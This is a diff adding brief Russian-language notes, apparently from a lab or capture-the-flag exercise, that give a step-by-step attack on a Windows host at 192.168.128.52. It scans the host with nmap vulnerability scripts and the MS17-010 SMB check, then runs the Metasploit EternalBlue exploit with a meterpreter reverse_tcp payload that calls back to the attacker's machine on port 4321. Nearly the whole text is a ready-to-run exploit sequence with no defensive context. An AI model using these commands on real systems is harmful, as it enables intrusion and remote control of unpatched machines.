@@ -1,0 +1,12 @@
+Исследуем на наличие уязвимости:
+sudo nmap -Pn -vv --script=vuln -oN vuln_test.nmap 192.168.128.52
+sudo nmap -p445 -vv --script smb-vuln-ms17-010.nse 192.168.128.52
+
+Эксплуатируем уязвимость через metasploit:
+msfconsole 
+use exploit/windows/smb/ms17_010_eternalblue
+set rhosts <target ip>
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost <ur ip>
+set lport 4321
+run 
